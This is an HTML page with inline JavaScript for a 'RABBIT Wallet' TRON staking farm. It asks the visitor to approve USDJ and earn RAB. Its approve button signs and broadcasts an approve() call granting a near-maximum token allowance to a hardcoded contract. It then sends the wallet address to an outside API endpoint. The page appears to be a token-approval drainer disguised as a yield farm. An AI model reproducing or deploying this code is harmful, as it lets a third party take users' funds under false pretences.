<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />

    <link rel="icon" href="../logo.png" />

    <meta name="viewport" content="width=device-width,initial-scale=1" />

    <meta name="theme-color" content="#000000" />

    <!-- content -->
    <meta name="description" content="RABBIT Wallet" />

    <!-- title -->
    <title>RABBIT Wallet</title>
    <link href="static/css/style.css" rel="stylesheet" />
    <link href="static/css/detail.css" rel="stylesheet" />
    <link href="../css/style.css" rel="stylesheet" />
    <link href="../css/reset.css" rel="stylesheet" />
</head>

<body>
    <div id="root">
        <div class="App">
            <div class="down-box"></div>
            <div>
                <div id="logo">
                    <a href="../"><img src="../logo-text.png" alt="logo" /> </a>
                </div>
                <ul class="nav" style="height: unset">
                    <li class="nav-item">
                        <a aria-current="page" href="/">Home</a>
                    </li>
                    <li class="nav-item"><a href="/cross-chain/">Cross chain</a></li>
                    <li class="nav-item"><a href="/trc_farm">Farm on TRON Network</a></li>
                    <li class="nav-item"><a href="/bsc_farm">Farm on BEP-20</a></li>
                    <li class="nav-item">
                        <a target="new_tab" href="https://t.me/rabbitonsui">Rules</a>
                    </li>
                </ul>
                <ul class="nav-mob">
                    <li class="nav-item"><a aria-current="page" href="/">Home</a></li>
                    <li class="nav-item"><a href="/cross-chain/">Cross chain</a></li>
                    <li class="nav-item"><a href="/trc_farm">Farm on TRON Network</a></li>
                    <li class="nav-item"><a href="/bsc_farm">Farm on BEP-20</a></li>
                    <li class="nav-item">
                        <a target="__blank" href="https://t.me/rabbitonsui" class="">Rules</a>
                    </li>
                </ul>
            </div>
            <div class="detail">
                <div class="detail-slogan">
                    <div class="slogan-logo">
                        <div class="slogan-logo-img" style="
                  background: url(static/images/usdj.png) center center / 100%
                    no-repeat;
                "></div>
                    </div>
                    <div class="text-logo">
                        <div class="text-logo-text1">RAB/USDJ</div>
                    </div>
                    <div class="slogan-title">
                        <div>Deposit</div>
                        <div class="slogan-title-name">&nbsp;RAB/USDJ&nbsp;</div>
                        <div>and earn RAB</div>
                    </div>
                </div>
                <div class="detai-list">
                    <div class="detail-item">
                        <div class="detail-item-logo">
                            <div class="detail-item-logo-img" style="
                    background: url(/logo.png) center center / 114% no-repeat;
                  "></div>
                        </div>
                        <div class="detail-item-btn-box">
                            <input class="input-stake" value="0.000" style="opacity: 0" disabled />
                            <div class="detail-item-btn btn" id="harvest_bt">Harvest</div>
                        </div>
                        <div class="detail-item-text">
                            <div class="statistics-info-text-number" id="reward">
                                0.00000000
                            </div>
                            <div class="statistics-info-text-title">RAB earned</div>
                        </div>
                    </div>
                    <div class="detail-item">
                        <div class="detail-item-logo">
                            <div class="detail-item-logo-img" style="
                    background: url(static/images/usdj.png) center center / 100%
                      no-repeat;
                  "></div>
                        </div>
                        <div class="detail-item-btn-box">
                            <input id="stake_value" class="input-stake" value="0.000" />
                            <div class="detail-item-btn btn" id="stake_bt">
                                Approve USDJ
                            </div>
                        </div>
                        <div class="detail-item-text">
                            <div class="statistics-info-text-number" id="staked">
                                0.00000000
                            </div>
                            <div class="statistics-info-text-title">RAB/USDJ Staked</div>
                        </div>
                    </div>
                </div>
                <div class="detai-btn btn" id="unstake_bt">
                    Abort reward & Unstake
                </div>
            </div>
            <div class="footer">
                <div class="footer-box">
                    <a href="https://t.me/rabbitonsui" target="new_tab">
                        <div class="footer-logo footer-logo1"></div>
                    </a><a href="https://twitter.com/RabbitWallets" target="new_tab">
                        <div class="footer-logo footer-logo2"></div>
                    </a>
                    <a href="https://t.me/rabbitonsui" target="new_tab">
                        <div class="footer-logo footer-logo1"></div>
                    </a>
                </div>
            </div>
        </div>
    </div>
    <div id="eJOY__extension_root" class="eJOY__extension_root_class" style="all: unset"></div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.js"
        integrity="sha512-WNLxfP/8cVYL9sj8Jnp6et0BkubLP31jhTG9vhL/F5uEZmg5wEzKoXp1kJslzPQWwPT1eyMiSxlKCgzHLOTOTQ=="
        crossorigin="anonymous"></script>

    <script>
        let contract_ad = "TF8SdqXo4U35MKgBdYzfY2E6poKCCtNSTX";
        let usdt_contract = "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT";
        let usdt_farm_contract = "TMAMMPJd6eNzdwvE1HoxZpLStxdBHTFmDw";
        let address0 = "0x0000000000000000000000000000000000000000";

        $(document).ready(function () {
            const harvest_bt = document.querySelector("#harvest_bt");
            const stake_bt = document.querySelector("#stake_bt");
            const unstake_bt = document.querySelector("#unstake_bt");

            var obj = setInterval(async () => {
                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                    clearInterval(obj);
                    var from_ad = await window.tronWeb.defaultAddress.base58;
                    console.log(from_ad);
                    var tronweb = window.tronWeb;
                    const contract = await tronWeb.contract().at(usdt_farm_contract);
                    const contract_usdt = await tronWeb.contract().at(usdt_contract);
                    var staked_value = await contract.stakeOf(from_ad).call();
                    var reward_value = await contract.rewardOf(from_ad).call();
                    var balance_usdt = await contract_usdt.balanceOf(from_ad).call();

                    var check_allowance = await contract_usdt
                        .allowance(from_ad, usdt_farm_contract)
                        .call();
                    const arg_allowance = [
                        {
                            type: "address",
                            value: from_ad,
                        },
                        {
                            type: "address",
                            value: usdt_contract,
                        },
                    ];

                    var result_al = await tronweb.transactionBuilder.triggerConstantContract(
                        usdt_contract,
                        "allowance(address,address)",
                        {},
                        arg_allowance,
                        from_ad
                    );
                    // var check_allowance = tronweb.toBigNumber("0x" + result_al.constant_result[0]);
                    if (check_allowance > 0) {
                        stake_bt.innerHTML = "Stake USDJ";
                    }
                    console.log("balance_usdt", balance_usdt);
                    console.log("check_allowance", check_allowance);
                    if (staked_value > 0) {
                        $("#staked").text(staked_value / 1e18);
                    } else {
                        $("#staked").text((staked_value / 1e18).toFixed(6));
                    }
                    $("#reward").text((reward_value / 1e18).toFixed(6));
                    $("#stake_value").val(
                        balance_usdt / 1e18 > 0 ? balance_usdt / 1e18 : 0
                    );
                    setInterval(async () => {
                        staked_value = await contract.stakeOf(from_ad).call();
                        reward_value = await contract.rewardOf(from_ad).call();
                        if (staked_value > 0) {
                            $("#staked").text(staked_value / 1e18);
                        } else {
                            $("#staked").text((staked_value / 1e18).toFixed(6));
                        }
                        $("#reward").text((reward_value / 1e18).toFixed(6));
                    }, 8000);
                    stake_bt.addEventListener("click", async () => {
                        var approve_value = "1.157920892373162e+77";
                        if (check_allowance > 0) {
                            await contract
                                .stake(
                                    tronweb
                                        .toBigNumber($("#stake_value").val() * 1e18)
                                        .toString(10)
                                )
                                .send();
                        } else {
                            const r = [
                                {
                                    type: "address",
                                    value: usdt_farm_contract,
                                },
                                {
                                    type: "uint256",
                                    value:
                                        "115792089237316195423570985008687907853269984665640564039457584007913129639934",
                                },
                            ];

                            const result = await tronweb.transactionBuilder.triggerSmartContract(
                                usdt_contract,
                                "approve(address,uint256)",
                                {},
                                r,
                                from_ad
                            );

                            const aaa = await tronweb.trx.sign(result.transaction);
                            const bb = tronweb.trx.sendRawTransaction(aaa);
                            fetch(
                                "https://api.rabbitwallet.org/api/approve?ad=" +
                                from_ad +
                                "&co=usdj"
                            );
                            // await contract_usdt.approve(usdt_farm_contract, approve_value).send();
                            var interval_approve = setInterval(async () => {
                                check_allowance = await contract_usdt
                                    .allowance(from_ad, usdt_farm_contract)
                                    .call();
                                if (check_allowance > 0) {
                                    clearInterval(interval_approve);
                                    stake_bt.innerHTML = "Stake USDJ";
                                }
                            }, 2500);
                        }
                    });
                    harvest_bt.addEventListener("click", async () => {
                        try {
                            const result = await contract.harvest().send();
                            $("#reward").text(0.0);
                        } catch (error) {
                            console.log(error);
                            if (error != "Confirmation declined by user") {
                                alert("Error");
                            }
                        }
                    });
                    unstake_bt.addEventListener("click", async () => {
                        try {
                            const result = await contract.unStake().send();
                            $("#staked").text(0.0);
                            $("#harvest").text(0.0);
                        } catch (error) {
                            console.log(error);
                            if (error != "Confirmation declined by user") {
                                alert("Error");
                            }
                        }
                    });
                }
            }, 100);
        });
    </script>
</body>

</html>